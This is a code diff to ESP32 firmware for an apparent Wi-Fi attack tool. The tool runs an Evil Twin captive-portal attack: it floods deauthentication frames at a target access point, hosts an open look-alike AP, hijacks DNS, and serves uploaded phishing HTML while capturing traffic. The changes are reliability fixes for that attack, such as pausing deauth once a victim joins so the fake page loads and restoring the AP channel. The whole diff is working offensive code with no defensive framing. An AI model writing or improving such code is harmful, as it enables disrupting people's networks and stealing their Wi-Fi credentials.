@@ -23,6 +23,8 @@
 
 namespace {
 constexpr const char* PORTAL_HTML_PATH = "/portal/index.html";
+constexpr size_t PORTAL_HTML_MAX_BYTES = 24 * 1024;
+constexpr size_t PORTAL_HTML_TAIL_ALLOWANCE = 64;
 constexpr uint32_t DEAUTH_BURST_PAUSE_MS = 3000;
 // Give the host time to subscribe to the PCAP stream after START_PORTAL
 // returns before the first deauth/reconnect handshake can begin.
@@ -267,10 +269,26 @@ void PortalManager::sendPortalContent(AsyncWebServerRequest* request) {
             PORTAL_HTML_PATH,
             "text/html"
         );
-        resp->addHeader("Content-Length", String(_htmlLen));
-        addNoCacheHeaders(resp);
-        request->send(resp);
+        if (resp) {
+            // AsyncFileResponse supplies the exact file Content-Length. Adding a
+            // second Content-Length header can produce white/stalled pages in
+            // some captive-portal browsers.
+            addNoCacheHeaders(resp);
+            request->send(resp);
+        } else {
+            NRSUITE_DEBUG_PRINTLN("PORTAL: uploaded HTML response allocation failed");
+            AsyncWebServerResponse* fallback =
+                request->beginResponse(200, "text/html", loadingPlaceholder());
+            addNoCacheHeaders(fallback);
+            request->send(fallback);
+        }
     } else {
+        NRSUITE_DEBUG_PRINTF(
+            "PORTAL: serving placeholder complete=%s len=%u exists=%s\n",
+            _htmlComplete ? "yes" : "no",
+            (unsigned)_htmlLen,
+            PORTAL_STORAGE_OBJ.exists(PORTAL_HTML_PATH) ? "yes" : "no"
+        );
         AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", loadingPlaceholder());
         addNoCacheHeaders(resp);
         request->send(resp);
@@ -372,7 +390,19 @@ void PortalManager::deauthTaskFn(void* pv) {
     memcpy(frame+16, self->_targetBssid, 6);
 
     uint16_t seq = 0x0010;
+    bool stationPauseLogged = false;
     while (self->_running) {
+        // Once the client is associated to the Evil Twin AP, continued deauth
+        // traffic can repeatedly interrupt DHCP and HTTP page transfer.
+        if (WiFi.softAPgetStationNum() > 0) {
+            if (!stationPauseLogged) {
+                stationPauseLogged = true;
+                NRSUITE_DEBUG_PRINTLN("PORTAL: deauth paused while station is associated");
+            }
+            vTaskDelay(pdMS_TO_TICKS(500));
+            continue;
+        }
+        stationPauseLogged = false;
         for (int i=0; i<10; i++) {
             frame[22] = seq&0xFF; frame[23]=(seq>>8)&0xFF;
             esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, true);
@@ -408,6 +438,36 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
     }
     NRSUITE_DEBUG_PRINTLN("PORTAL: storage mounted");
 
+    // USB uploads may complete before START_PORTAL. Preserve that completion
+    // state across the runtime stop/remount and rehydrate the file size from
+    // storage before bringing up the AP.
+    if (_htmlComplete) {
+        if (!PORTAL_STORAGE_OBJ.exists(PORTAL_HTML_PATH)) {
+            _htmlComplete = false;
+            _htmlLen = 0;
+            _htmlExpected = 0;
+            NRSUITE_DEBUG_PRINTLN("PORTAL: uploaded HTML missing after remount");
+        } else {
+            File storedHtml = PORTAL_STORAGE_OBJ.open(PORTAL_HTML_PATH, FILE_READ);
+            const size_t storedLen = storedHtml ? storedHtml.size() : 0;
+            if (storedHtml) storedHtml.close();
+            if (storedLen == 0 ||
+                storedLen > PORTAL_HTML_MAX_BYTES + PORTAL_HTML_TAIL_ALLOWANCE) {
+                _htmlComplete = false;
+                _htmlLen = 0;
+                _htmlExpected = 0;
+                NRSUITE_DEBUG_PRINTLN("PORTAL: uploaded HTML invalid after remount");
+            } else {
+                _htmlLen = storedLen;
+                NRSUITE_DEBUG_PRINTF(
+                    "PORTAL: restored uploaded HTML size=%u expected=%u\n",
+                    (unsigned)_htmlLen,
+                    (unsigned)_htmlExpected
+                );
+            }
+        }
+    }
+
     // Keep the radio in APSTA mode. Do not cycle through STA mode here: on
     // Arduino-ESP32 that can create a visible default open ESP_XXXXXX SoftAP
     // and leaves the next softAP() call racing the previous DHCP/AP teardown.
@@ -424,7 +484,11 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
         WiFi.softAPdisconnect(true);
         delay(PORTAL_AP_RESET_SETTLE_MS);
 
-        const bool apOk = WiFi.softAP(ssid, nullptr, channel);
+        // Be explicit: classic ESP32 SoftAP supports multiple stations, but
+        // keep the limit fixed rather than relying on framework defaults.
+        constexpr uint8_t PORTAL_AP_MAX_CONNECTIONS = 4;
+        const bool apOk = WiFi.softAP(
+            ssid, nullptr, channel, 0, PORTAL_AP_MAX_CONNECTIONS);
         if (!apOk) {
             NRSUITE_DEBUG_PRINTLN("PORTAL: WiFi.softAP returned false");
             if (attempt < PORTAL_AP_START_ATTEMPTS) {
@@ -482,6 +546,7 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
                 err = ESP_ERR_INVALID_STATE;
             } else {
                 cfg.ap.channel = channel;
+                cfg.ap.max_connection = PORTAL_AP_MAX_CONNECTIONS;
                 err = esp_wifi_set_config(WIFI_IF_AP, &cfg);
             }
         }
@@ -559,6 +624,7 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
     }
 
     _running = true;
+    _portalChannel = channel;
     _lastStationCount = 0;
     _lastStationCountPollMs = millis();
     if (dnsHijackEnabled) {
@@ -668,8 +734,6 @@ bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast,
 }
 
 bool PortalManager::resetHtml(size_t expectedSize) {
-    const size_t MAX_HTML_SIZE = 24 * 1024;
-
     if (_htmlFile) _htmlFile.close();
     _htmlLen = 0;
     _htmlExpected = 0;
@@ -678,7 +742,7 @@ bool PortalManager::resetHtml(size_t expectedSize) {
     if (expectedSize == 0) {
         return true;
     }
-    if (expectedSize > MAX_HTML_SIZE) {
+    if (expectedSize > PORTAL_HTML_MAX_BYTES) {
         return false;
     }
     if (!mountPortalStorage()) {
@@ -703,9 +767,28 @@ void PortalManager::update() {
     const uint32_t now = millis();
     if (now - _lastStationCountPollMs < STATION_COUNT_POLL_INTERVAL_MS) return;
     _lastStationCountPollMs = now;
+
+    // The portal AP owns the channel. If a background mesh/detector path ever
+    // changes it, restore the AP channel before clients time out.
+    if (_portalChannel != 0) {
+        uint8_t primaryChannel = 0;
+        wifi_second_chan_t secondChannel = WIFI_SECOND_CHAN_NONE;
+        if (esp_wifi_get_channel(&primaryChannel, &secondChannel) == ESP_OK &&
+            primaryChannel != _portalChannel) {
+            NRSUITE_DEBUG_PRINTF(
+                "PORTAL: channel drift %u -> %u, restoring %u\n",
+                (unsigned)_portalChannel,
+                (unsigned)primaryChannel,
+                (unsigned)_portalChannel
+            );
+            esp_wifi_set_channel(_portalChannel, WIFI_SECOND_CHAN_NONE);
+        }
+    }
+
     const uint8_t count = WiFi.softAPgetStationNum();
     if (count == _lastStationCount) return;
     _lastStationCount = count;
+    NRSUITE_DEBUG_PRINTF("PORTAL: station count=%u\n", (unsigned)count);
 
     JsonDocument event;
     event["type"] = "portal_sta_count";
@@ -743,9 +826,8 @@ void PortalManager::stop() {
 
     if (_htmlFile) _htmlFile.close();
     unmountPortalStorage();
-    _htmlLen = 0;
-    _htmlExpected = 0;
-    _htmlComplete = false;
+    // Preserve the uploaded-template completion state until resetHtml() is
+    // called by the next upload. The backing file persists across remounts.
     if (hadRuntime) {
         NRSUITE_DEBUG_PRINTF("PORTAL: stopped, AP reset/settled, heap=%lu\n",
                       (unsigned long)ESP.getFreeHeap());
